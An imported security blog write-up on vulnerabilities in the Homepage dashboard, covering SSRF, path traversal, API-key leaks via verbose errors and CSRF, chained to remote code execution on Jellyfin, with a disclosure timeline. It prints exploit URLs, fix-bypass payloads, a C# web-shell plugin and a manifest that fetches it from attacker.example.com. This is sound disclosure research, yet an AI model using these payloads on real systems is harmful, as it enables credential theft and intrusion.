---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-08-22_vulnerabilities-in-homepage-dashboard.md
original_filename: 2024-08-22_vulnerabilities-in-homepage-dashboard.md
title: Vulnerabilities in Homepage Dashboard
category: documents
detected_topics:
- command-injection
- api-security
- ssrf
- csrf
- information-disclosure
- mobile-security
tags:
- imported
- documents
- command-injection
- api-security
- ssrf
- csrf
- information-disclosure
- mobile-security
language: en
raw_sha256: fab4bffa533724d62d428dbe52639e95f66347885a73e4ccc577d151e403214c
text_sha256: b2e1f193dc35841edc2b57bb7c87100ad4691c30bcc00c2bdcadfe4d1a8031a2
ingested_at: '2026-06-28T07:32:37Z'
sensitivity: unknown
redactions_applied: true
---

# Vulnerabilities in Homepage Dashboard

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-08-22_vulnerabilities-in-homepage-dashboard.md
- Source Type: markdown
- Detected Topics: command-injection, api-security, ssrf, csrf, information-disclosure, mobile-security
- Ingested At: 2026-06-28T07:32:37Z
- Redactions Applied: True
- Raw SHA256: `fab4bffa533724d62d428dbe52639e95f66347885a73e4ccc577d151e403214c`
- Text SHA256: `b2e1f193dc35841edc2b57bb7c87100ad4691c30bcc00c2bdcadfe4d1a8031a2`


## Content

---
title: "Vulnerabilities in Homepage Dashboard"
page_title: "Vulnerabilities in Homepage Dashboard - Anvil Secure"
url: "https://www.anvilsecure.com/blog/vulnerabilities-in-homepage-dashboard.html"
final_url: "https://www.anvilsecure.com/blog/vulnerabilities-in-homepage-dashboard.html"
authors: ["Daniel Kachakil"]
programs: ["Homepage"]
bugs: ["RCE", "SSRF", "CSRF", "Information disclosure", "Jellyfin"]
publication_date: "2024-08-22"
added_date: "2024-08-26"
source: "pentester.land/writeups.json"
original_index: 52
---

# Vulnerabilities in Homepage Dashboard

![Vulnerabilities in Homepage Dashboard](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==)

![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==) By Anvil SecureOn August 22, 2024August 22, 2024 __0 Comments

_By Daniel Kachakil_

Homepage is an open-source customizable web application dashboard with integrations for over 100 services. This blog post explains how I could exploit the vulnerabilities I found in the latest version of Homepage at that time (v0.8.13) to fully compromise a Jellyfin server achieving remote code execution by deploying a custom plugin, among other vulnerabilities. The same vulnerabilities and techniques described here could also be leveraged to exploit a variety of integrations.

![Homepage dashboard](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==)

## What is Homepage?

With such a generic name one may wonder what this is all about, as the common "homepage" word may refer to several things. In this case, we are referring to an open-source web application implementing a customizable dashboard. With several thousands of stars and forks in GitHub, its official GitHub repository and documentation pages are:

  * <https://github.com/gethomepage/homepage>
  * <https://gethomepage.dev/>

Homepage has built-in integrations with over a hundred services, including popular applications like Radarr, Sonarr, Bazarr, Plex, Jellyfin, Emby, qBittorrent, etc. It is configured with YAML files, or Docker labels, and it integrates with the different services relying on API keys and other types of credentials, such as usernames and passwords.

The integration is achieved by sending authenticated (and generally highly privileged) requests to the underlying applications and services. However, by design, Homepage itself does not currently support any kind of authentication, so any anonymous user could access it (unless configured behind an authenticated reverse proxy, or if additional precautions and countermeasures were taken by the users who have it deployed).

The official documentation does not offer any guidance to deploy it in a secure manner. Quite the contrary, it may give its users a false sensation of security by stating [the following](https://github.com/gethomepage/homepage/blob/9803ef70c644096284e1d925ac58449d40709edc/README.md?plain=1#L9):

> _A modern, fully static, fast,**secure** fully proxied, highly customizable application dashboard with integrations for over 100 services..._

And in the [README](https://github.com/gethomepage/homepage/blob/9803ef70c644096284e1d925ac58449d40709edc/README.md?plain=1#L40) file:

> **_Secure_** _\- All API requests to backend services are proxied, keeping your API keys hidden. Constantly reviewed for security by the community._

Feature requests to implement authentication have been opened by some users, but these were all closed by the maintainers, as there were no plans to implement that. One of the [arguments by the maintainers](https://github.com/gethomepage/homepage/discussions/529#discussioncomment-4908398) was:

> _with the exception of playing / pausing media, homepage is 99% "read-only"_

It was trivial to find several publicly exposed Homepage dashboards (using search engines like Shodan.io, for example), indicating that not all users are aware of the risks of exposing it to the Internet.

### Some Additional Context

[Docker Compose NAS](https://github.com/AdrienPoupa/docker-compose-nas), from Adrien Poupa, is a relatively popular Docker Compose file which deploys and configures several applications at once, including Radarr, Sonarr, Jellyfin, qBittorrent and, of course, the Homepage dashboard.

If you never heard of these open-source applications, in a nutshell, [Jellyfin](https://jellyfin.org/) is a media server, and [qBittorrent](https://www.qbittorrent.org/) is a peer-to-peer (P2P) client for the BitTorrent file-sharing protocol. When these and other applications (like Jellyserr, Bazarr, Prowlerr, etc.) are integrated, users can have a self-hosted media server, able to automatically download movies, series, subtitles, and to stream them to any device. Homepage offers an easy way to display the current statuses and statistics of all these applications.

But Homepage does not only integrate with media applications. Several other services and applications are also supported and can also be integrated, as can be seen in the [documentation for available widgets](https://gethomepage.dev/main/widgets/).

## Setup

When I came across Homepage for the first time, one of the things that immediately caught my attention was how most of its core functionality seemed to work. From a security mindset, many aspects looked a bit scary, so I decided to take a deeper look.

To start my research in a fully controlled and local environment, I wrote a simple custom Docker Compose file, with only three containers (Homepage, Jellyfin, and qBittorrent). Still, the exploitation methods described in this article are also valid for any other similar deployments or integrations, regardless of if these are deployed via Docker, as standalone applications, or any other kind of supported mechanism.

Specifically, I used the following Docker images and versions, which were the latest at that time:

  * `io/gethomepage/homepage:latest` (v0.8.13)
  * `jellyfin/Jellyfin` (v10.8.13)
  * `io/linuxserver/qbittorrent:libtorrentv1` (release-4.6.4_v1.2.19-ls25)

![Self-deployed Homepage](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==)

## Vulnerabilities

As a disclaimer, this is by no means a comprehensive security review of the Homepage dashboard, but only a small set of vulnerabilities I identified spending a very limited amount of time testing the application and looking at selected fragments of its source code. The majority of these vulnerabilities were trivial to discover and exploit.

### Information Disclosure

While the Homepage dashboard only displays very limited data (such as the current download speed, or the number of seeds for the qBittorrent service), many of the HTTP responses to the requests sent by these widgets contain information that may and should be considered sensitive. For example, the full list of Torrent files in the qBittorrent service, the list of movies and series downloaded by Sonarr and Radarr, usernames, internal paths, IP addresses and sessions in Jellyfin, etc. In some cases, even personal email addresses and owners' names could be exposed.

Because this data is not displayed anywhere in the dashboard, a regular user may not be aware that all this information is actually exposed to anyone with access to their Homepage dashboard.

Requests like the ones below are being sent by default by its widgets, so no tampering or additional tools are necessary to reproduce this. Just inspect the network traffic using the browser's developer tools.
  
  
  http(s)://<homepage-address>/api/services/proxy?type=qbittorrent&group=Download&service=qBittorrent&endpoint=torrents%2Finfo

Response:
  
  
  [
  {
  "added_on": 1715183386,
  "amount_left": 276445467,
  "auto_tmm": false,
  "availability": 0,
  "category": "",
  "completed": 0,
  "completion_on": 0,
  "content_path": "/downloads/Big Buck Bunny",
  "dl_limit": 0,
  "dlspeed": 0,
  "download_path": "",
  "downloaded": 603772,
  "downloaded_session": 603772,
  "eta": 8640000,
  "f_l_piece_prio": false,
  "force_start": false,
  "hash": "dd8255ecdc7ca55fb0bbf81323d87062db1f6d1c",
  ...
  
  
  
  http(s)://<homepage-address>/api/services/proxy?type=sonarr&group=Media&service=Sonarr&endpoint=queue%2Fdetails

Response:
  
  
  [
  {
  "trackedDownloadState": "downloading",
  "trackedDownloadStatus": "ok",
  "timeLeft": "00:00:00",
  "size": 2762355452,
  "sizeLeft": 2097152,
  "seriesId": 102,
  "episodeTitle": "A redacted episode name",
  "episodeId": 10354,
  "status": "downloading",
  ...
  

![Traffic leaking qBittorrent information](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==)

To mitigate this, instead of relying on the client-side code to process the full response to only display a few aggregated values, Homepage should have processed the proxied response on the server side, returning only the data that will be displayed.

Before reporting this as a vulnerability, I searched in the documentation and GitHub repository, discovering that this was previously reported in issues and discussions (for example, <https://github.com/gethomepage/homepage/discussions/2459>).

As the maintainers were aware and decided to dismiss these issues, instead of reporting it again, I asked them to reconsider this decision as part of the recommendations for the security advisories I reported.

### Server-Side Request Forgery and Path Traversal

The proxy feature seems to be pretty much by design, as it can be considered the core of how Homepage works, but that does not make it any less dangerous. Several integrations were vulnerable to SSRF, allowing users with access to a Homepage dashboard to send requests to unexpected internal APIs of the integrated services, and retrieve their responses. These requests are generally authenticated with privileged credentials for the affected services. Depending on the service, the impact of this could be critical, including **remote code execution (RCE)** , as demonstrated later with a proof of concept for Jellyfin.

For example, the qBittorrent integration could be easily abused to retrieve internal settings, including plaintext passwords for SMTP, Proxies, or DynDNS services (if any of these optional settings were configured), by simply setting the `endpoint` parameter to `app/preferences`. This is a [documented API](https://github.com/qbittorrent/qBittorrent/wiki/WebUI-API-\(qBittorrent-4.1\)#get-application-preferences) which returns these passwords and other settings:
  
  
  http(s)://<homepage-address>/api/services/proxy?type=qbittorrent&group=Download&service=qBittorrent&endpoint=app/preferences

Response:
  
  
  {
  "add_to_top_of_queue": false,
  "add_trackers": "",
  ...,
  "dyndns_enabled": true,
  "dyndns_password": "my-password",
  "dyndns_service": 0,
  "dyndns_username": "my-username",
  "mail_notification_password": "my-smtp-password",
  "mail_notification_sender": "qBittorrent_notification@example.com",
  "mail_notification_smtp": "smtp.example.com",
  "mail_notification_ssl_enabled": false,
  "mail_notification_username": "my-smtp-username",
  ...
  }
  

Here is another example obtaining a fresh JWT access token from an Nginx Proxy Manager integration by targeting the `tokens` API:
  
  
  http(s)://<homepage-address>/api/services/proxy?type=npm&group=Server&service=Nginx+Proxy+Manager&endpoint=tokens

Response:
  
  
  {"token":"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.(REDACTED PAYLOAD).(REDACTED SIGNATURE)","expires":"2024-05-29T16:14:21.104Z"}
  

Other integrations, such as the one for Jellyfin or Emby, are more limited and arbitrary URL paths could not be passed to the `endpoint` parameter as we just did. However, one of the features implemented by its Homepage widget (the `PlayControl` endpoint) was vulnerable to **path traversal** , so this could be easily abused as well. In this case, it could only be abused to perform POST requests with empty bodies, but this is enough to perform certain actions. For example, an attacker could install arbitrary plugins from the default repository by sending the following request:
  
  
  http(s)://<homepage-address>/api/services/proxy?type=emby&group=Media&service=Jellyfin&endpoint=PlayControl&segments=%7B%22sessionId%22%3A%22x%22%2C%22command%22%3A%22../../../../Packages/Installed/OPDS%22%7D

Or create new API keys (which are always highly privileged) with an arbitrary name:
  
  
  http(s)://<homepage-address>/api/services/proxy?type=emby&group=Media&service=Jellyfin&endpoint=PlayControl&segments=%7B%22sessionId%22%3A%22x%22%2C%22command%22%3A%22../../../../Auth/Keys%3fapp=you-were-hacked%22%7D

Unfortunately (from an attacker's perspective), Jellyfin would not return the value of the randomly generated API key in the response to this request, but users would be surely scared enough if they see an API key called "`you-were-hacked`" in their Jellyfin administration page.

![API key injected in Jellyfin instance](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==)

Among other actions, it is also possible to shut down (via the `System/Shutdown` API) or restart (`System/Restart`) the Jellyfin service, which may be required for a newly installed plugin to be loaded.

Another interesting vulnerability could be exploited by tampering with the `type` parameter supported by the Homepage `proxy` API, setting it to `customapi`. The credentials of the service would still be appended to the URL, and this could be abused to bypass several of the previous restrictions and send requests with any HTTP verb to arbitrary URL paths. For example, to leak all privileged API keys in Jellyfin, we could send the following request:
  
  
  http(s)://<homepage-address>/api/services/proxy?type=customapi&group=Media&service=Jellyfin&endpoint=Auth/Keys

Response:
  
  
  {
  "Items": [
  {
  "Id": 0,
  "AccessToken": "08911d32e1054e40a6c47cf36324efb2",
  "DeviceId": "",
  "AppName": "homepage",
  "AppVersion": "",
  "DeviceName": "",
  "UserId": "00000000000000000000000000000000",
  "IsActive": false,
  "DateCreated": "2024-05-07T15:34:17.8108366Z",
  "DateLastActivity": "0001-01-01T00:00:00.0000000Z"
  },
  {
  "Id": 0,
  "AccessToken": "e40e576add9643e09260eff9b6bc7159",
  "DeviceId": "",
  "AppName": "you-were-hacked",
  "AppVersion": "",
  "DeviceName": "",
  "UserId": "00000000000000000000000000000000",
  "IsActive": false,
  "DateCreated": "2024-05-09T12:54:31.8291661Z",
  "DateLastActivity": "0001-01-01T00:00:00.0000000Z"
  }
  ],
  "TotalRecordCount": 3,
  "StartIndex": 0
  }
  

Note that the API keys for Jellyfin have no customizable permissions, so they always grant full privileges to the caller. Also, note that the `IsActive` parameter in the response was always set to `false` for every returned API key, but this does not seem to be in use, as they all were fully functional.

Since all HTTP verbs could be proxied to the underlying service, this could also be exploited to delete resources or perform other malicious actions. In this case, POST and PUT requests could be sent, but I could not find a way to set the `Content-Type` header to `application/json`, as most Jellyfin APIs required.

### Verbose Errors Leaking Privileged API Keys

Homepage attempts to protect the sensitive and privileged API keys it uses to communicate with several applications it integrates with. It does that by masking the sensitive values of some query string parameters. This was implemented in the [following function](https://github.com/gethomepage/homepage/blob/ea63716b61fc9af0228e1f910dc960ee8da36664/src/utils/proxy/api-helpers.js#L57-L64):
  
  
  export function sanitizeErrorURL(errorURL) {
  // Dont display sensitive params on frontend
  const url = new URL(errorURL);
  ["apikey", "api_key", "token", "t", "access_token", "auth"].forEach((key) => {
  if (url.searchParams.has(key)) url.searchParams.set(key, "***");
  });
  return url.toString();
  }
  

However, leveraging the widespread arbitrary URL manipulation issues, it was also trivial to inject a hash character (`#`, URL-encoded as `%23`) anywhere in the URL so the original query string will become part of the URL fragment and will no longer be recognized as a sensitive parameter.

For example, this is one of the many ways an attacker could obtain the API key for the Jellyfin application:
  
  
  http(s)://<homepage-address>/api/services/proxy?type=emby&group=Media&service=Jellyfin&endpoint=PlayControl&segments=%7B%22sessionId%22%3A%22x%22%2C%22command%22%3A%22%23%22%7D

Response:
  
  
  {
  "error": {
  "message": "HTTP Error",
  "url": "http://jellyfin:8096/emby/Sessions/x/Playing/#?api_key=***REDACTED***,
  "resultData": {
  "type": "Buffer",
  "data": []
  }
  }
  }
  

### Cross-Site Request Forgery

If Homepage is not already directly accessible or publicly exposed, nothing would prevent a web browser from issuing requests to the internal endpoint where Homepage is hosted, including `localhost`. Depending on the `type` parameter, the `/api/services/proxy` API endpoint accepted multiple HTTP verbs, such as GET, POST, PUT, or DELETE.

For example, for the Jellyfin integration all of these HTTP verbs were equivalent in the “PlayControl” endpoint. It is somewhat frequent to find misconfigured applications performing actions with GET requests, but in this case even an OPTIONS request (that could be part of a CORS preflight check from the browser) could be used to perform actions, including potentially malicious ones.

If a victim in a network with access to Homepage visited an internal or external website containing a simple HTML image tag with a specially crafted URL, or custom JavaScript code (for instance, targeting several internal IPs and ports if the Homepage endpoint is not previously known), the majority of vulnerabilities would become remotely exploitable. In principle, responses could not be exfiltrated due to the Same-Origin Policy and the lack of permissive headers in the Homepage responses.

## Demonstrating the Impact: RCE in Jellyfin

To demonstrate the impact of what could happen if an attacker gets access to an API key for Jellyfin, assuming that its endpoint is also reachable, I wrote a very simple plugin implementing a basic web shell, allowing for arbitrary code execution.

Note that this is not a vulnerability in Jellyfin itself. It is just a well-known way for an attacker with administrative privileges to abuse a legitimate feature.

To develop that plugin, I started by cloning the default [plugin template](https://github.com/jellyfin/jellyfin-plugin-template) and adding a new ASP.NET controller class:
  
  
  [ApiController]
  [Route("[controller]")]
  public class PluginController : ControllerBase
  {
  [HttpGet("/exec")]
  public IActionResult ExecuteOsCommand([FromQuery] string cmd, [FromQuery] string ? args)
  {
  var psi = new ProcessStartInfo(cmd)
  {
  Arguments = args,
  RedirectStandardOutput = true,
  RedirectStandardError = true,
  UseShellExecute = false
  };
  var process = Process.Start(psi);
  string ? result = process?.StandardOutput.ReadToEnd() + "\n" + process?.StandardError.ReadToEnd();
  process?.WaitForExit();
  
  return Content(result, "text/plain");
  }
  }
  

A few other things like the GUID and plugin's name also had to be adjusted. Then, I compiled the plugin, compressed the DLL as a ZIP file, computed its MD5 checksum and created a manifest JSON file with the following contents:
  
  
  [
  {
  "category": "Code Execution",
  "guid": "ff0ab45d-0423-476a-8e46-6088c20530ae",
  "name": "RCE Plugin",
  "versions": [
  {
  "checksum": "f3f455735ab401e9af61964c153c1228",
  "changelog": "First version",
  "targetAbi": "10.6.0.0",
  "sourceUrl": "http://attacker.example.com/rce-plugin.zip",
  "version": "0.0.0.0"
  }
  ]
  }
  ]

To proceed with the installation, both files (ZIP and JSON) had to be uploaded to any server reachable by the Jellyfin instance. Then, send an HTTP request to the Jellyfin endpoint authenticated with the leaked API key to add our controlled URL as a new plugins' repository:
  
  
  POST /Repositories?apikey=***REDACTED*** HTTP/1.1
  Host: jellyfin.example.com:8096
  Content-Type: application/json
  Content-Length: 209
  
  
  
  [
  {
  "Name": "Jellyfin Stable",
  "Url": "https://repo.jellyfin.org/releases/plugin/manifest-stable.json",
  "Enabled": true
  },
  {
  "Name": "Malicious Repository",
  "Url": "http://attacker.example.com/manifest.json",
  "Enabled": true
  }
  ]
  

Once our custom repository is added, installing the RCE plugin can be achieved like this:
  
  
  POST /Packages/Installed/RCE%20Plugin?apikey=***REDACTED*** HTTP/1.1
  Host: jellyfin.example.com:8096
  

![Custom RCE plugin installed in Jellyfin](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==)

For a plugin to take effect, the Jellyfin instance must be restarted. As the reboot API did not seem to be enough, to shut it down (it will automatically reboot in most Docker configurations) we can send:
  
  
  POST /System/Shutdown?apikey=***REDACTED*** HTTP/1.1
  Host: jellyfin.example.com:8096
  

Once restarted, the plugin will be enabled, and a new unauthenticated API handler will be available to execute arbitrary OS commands in the target Jellyfin instance. For example:
  
  
  GET /exec?cmd=ls&args=-la HTTP/1.1
  Host: jellyfin.example.com:8096
  

Response:
  
  
  HTTP/1.1 200 OK
  Content-Length: 1208
  ...
  
  total 88
  drwxr-xr-x   1 root root 4096 May  8 15:23 .
  drwxr-xr-x   1 root root 4096 May  8 15:23 ..
  drwxr-xr-x   2 root root 4096 Nov 20 00:00 bin
  drwxr-xr-x   2 root root 4096 Sep 29  2023 boot
  drwxrwxrwx   4 root root 4096 May 15 14:31 cache
  drwxrwxrwx   9 root root 4096 May  7 15:33 config
  drwxr-xr-x   5 root root  340 May 15 15:03 dev
  -rwxr-xr-x   1 root root    0 May  8 15:23 .dockerenv
  drwxr-xr-x   1 root root 4096 May  8 15:23 etc
  drwxr-xr-x   2 root root 4096 Sep 29  2023 home
  drwxr-xr-x   1 root root 4096 Nov 29 21:50 jellyfin
  drwxr-xr-x   1 root root 4096 Nov 20 00:00 lib
  drwxr-xr-x   2 root root 4096 Nov 20 00:00 lib64
  drwxrwxrwx   1 root root 4096 May  7 11:59 media
  drwxr-xr-x   2 root root 4096 Nov 20 00:00 mnt
  drwxr-xr-x   2 root root 4096 Nov 20 00:00 opt
  dr-xr-xr-x 297 root root    0 May 15 15:03 proc
  drwx------   1 root root 4096 May  8 15:23 root
  drwxr-xr-x   3 root root 4096 Nov 20 00:00 run
  drwxr-xr-x   2 root root 4096 Nov 20 00:00 sbin
  drwxr-xr-x   2 root root 4096 Nov 20 00:00 srv
  dr-xr-xr-x  11 root root    0 May 15 15:03 sys
  drwxrwxrwt   1 root root 4096 May 15 15:03 tmp
  drwxr-xr-x   1 root root 4096 Nov 20 00:00 usr
  drwxr-xr-x   1 root root 4096 Nov 20 00:00 var
  

## Bypassing the Fixes in v0.9.0

As a response to the first three security advisories I reported, Homepage maintainers published a [new version (v0.9.0)](https://github.com/gethomepage/homepage/commit/b3cf985d4a522a666544c7cea92ab56af8520d71) with fixes. I had a quick look at these changes and quickly noticed that most fixes were clearly insufficient, as most of the recommendations I included in the advisories I reported were not implemented.

To address the path traversal and other issues, I recommended applying URL-encoding to any user-controlled input that will end up in HTTP requests sent by the backend, but the fixes did not include that. Instead, the mitigation relied on insufficient input validation, rejecting only forward slashes (`/`). I also suggested to add a new setting to explicitly enable verbose errors, keeping it disabled by default, but that was also dismissed.

I could easily bypass the fixes to leak the current API key for Jellyfin with the following slightly modified payload (as the `PlayControl` endpoint was replaced by `Pause` and `Unpause`, and the `command` parameter was removed in v0.9.0):
  
  
  http(s)://<homepage-address>/api/services/proxy?type=emby&group=Media&service=Jellyfin&endpoint=Unpause&segments=%7b%22sessionId%22%3a%22%23%22%7d

In addition, backslashes (`\`) could be used to bypass the fixes and continue exploiting the same path traversal and SSRF issues I originally reported. For example, this still allowed to inject a new API key in Jellyfin:
  
  
  http(s)://<homepage-address>/api/services/proxy?type=emby&group=Media&service=Jellyfin&endpoint=Unpause&segments=%7b%22sessionId%22%3a%22..\\..\\Auth\\Keys%3fapp=you-were-hacked-again%26%z=%22%7d

And this installed the `OPDS` plugin from the default repository:
  
  
  http(s)://<homepage-address>/api/services/proxy?type=emby&group=Media&service=Jellyfin&endpoint=Unpause&segments=%7b%22sessionId%22%3a%22..\\..\\Packages\\Installed\\OPDS%3f%22%7d

Also, no action was taken by the maintainers to mitigate the information disclosure, CSRF, and other reported vulnerabilities, so a few minutes after I bypassed these fixes, I privately reported another security advisory with the updated payloads. I also reiterated my original recommendations and elaborated on some of them, mainly to help the maintainers understand why the fixes were insufficient and what could be done to mitigate them.

# Version 0.9.1

In response to my last security advisory, Homepage maintainers promptly removed v0.9.0 from the releases page (maybe also rewriting the Git history) and released v0.9.1 with updated fixes.

![Homepage v.0.9.1](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==)

The function to prevent disclosure of API keys was improved to also identify sensitive parameters in the URL fragment part (also called URL hash), in addition to the URL query, effectively mitigating the scenarios where a hash sign (`#`) could be injected.

Additional mitigations were introduced to also forbid backslashes (`\`) and double dot (`..`) sequences but ignoring again the recommendations to URL-encode user-controlled values. It was still possible to inject strings like `action#`, or `unwanted-action?p1=x&p2=y&x=` in the Jellyfin `Pause` and `Unpause` endpoints, and probably other integrations relying on the `segments` parameter.

Following my original recommendations, the `type` parameter was completely removed from the `proxy` endpoint. Given that this information is already in the configuration for each service, this parameter was unnecessary. This should mitigate the exploits relying on `customapi` or leveraging any other unexpected types.

Several integrations were also changed to prevent an attacker from supplying arbitrary strings to the `endpoint` parameter. Instead, Homepage now only accepts predefined values, mitigating SSRF vulnerabilities in the few integrations I reported, as well as in other affected instances the maintainers identified.

A few changes were also applied to mitigate some of the CSRF attack vectors, such as changing some GET requests to POST. Anyway, CSRF attacks would have little to no impact as long as they could be used to exploit other more dangerous vulnerabilities, such as SSRF or path traversal.

No actions were taken to prevent widespread information disclosure in multiple integrations, so this was still considered a _feature_ rather than a security concern.

## Conclusion

By identifying and reporting these vulnerabilities, as well as subsequent bypasses for several of the initial fixes and providing recommendations on how to mitigate them, the Homepage dashboard has strengthened its security posture.

While not all recommendations were applied, the maintainers' reaction was very fast. As open-source volunteers, their collaboration addressing these vulnerabilities will surely be appreciated by Homepage users.

Any version prior to v0.9.1 is likely or surely affected by one or more of the vulnerabilities described in this blog post. Updating to the latest version is highly advised.

Considering that the latest version at the time of writing this (v0.9.6) still allows unauthenticated attackers to abuse the information disclosure in several integrations, and also that other vulnerabilities might be still present, it is also recommended not to expose the Homepage dashboard to the public internet, or to any untrusted network; at least not without a proper authentication mechanism via a reverse proxy or by any other means, especially when using widgets with access to potentially sensitive services or data.

# Responsible Disclosure Timeline

  * May 2024: Anvil discovers the first vulnerability and starts investigating other issues across the following weeks, identifying more vulnerabilities and chaining them for an increased impact.
  * 2024-05-31: Anvil reports the vulnerabilities as three peer-reviewed private security advisories through the official [GitHub repository](https://github.com/gethomepage/homepage/security): 
  * `GHSA-57p5-8wrv-8h8j`: Verbose Errors May Leak Privileged API Keys.
  * `GHSA-24m5-7vjx-9x37`: Server-Side Request Forgery in Multiple Integrations.
  * `GHSA-xp32-p6pp-f26g`: Cross-Site Request Forgery.
  * 2024-06-01: Homepage maintainers close two of them (`GHSA-57p5-8wrv-8h8j` and `GHSA-xp32-p6pp-f26g`) and rename the remaining one to address all vulnerabilities in the same security advisory (GHSA-24m5-7vjx-9x37).
  * 2024-06-03: Homepage maintainers publish the remaining [security advisory](https://github.com/gethomepage/homepage/security/advisories/GHSA-24m5-7vjx-9x37), removing all the original details and keeping a short summary.
  * 2024-06-03: Homepage maintainers publish v0.9.0 with several fixes.
  * 2024-06-03: Anvil provides an updated PoC for the recently released version (v0.9.0), demonstrating that the fix for `GHSA-57p5-8wrv-8h8j` was insufficient. API keys could still be leaked using the original payload with minor adjustments.
  * 2024-06-03: Anvil identifies several bypasses for the recent fixes and reports a new advisory (`GHSA-9p6f-2598-r569`: Insufficient Fixes in v0.9.0 for SSRF, Path Traversal, and CSRF).
  * 2024-06-03: Homepage maintainers acknowledge and close the new advisory (`GHSA-9p6f-2598-r569`), apply additional fixes, unpublish v0.9.0, and publish v0.9.1.
  * 2024-08-22: Blog post published.

### About the Author

Daniel Kachakil is a Principal Security Engineer at Anvil Secure, where he leads the Application Security team. He has performed complex penetration testing and developed proficiency in a wide range of architectures and operating systems working in information security over the past 15 years. Daniel is a speaker and published author on topics including mobile security, cryptography, web hacking, and SQL injection, and is also an ethical hacking instructor.

[ __](https://www.linkedin.com/company/anvil-secure/) [ __](https://twitter.com/anvil_secure)
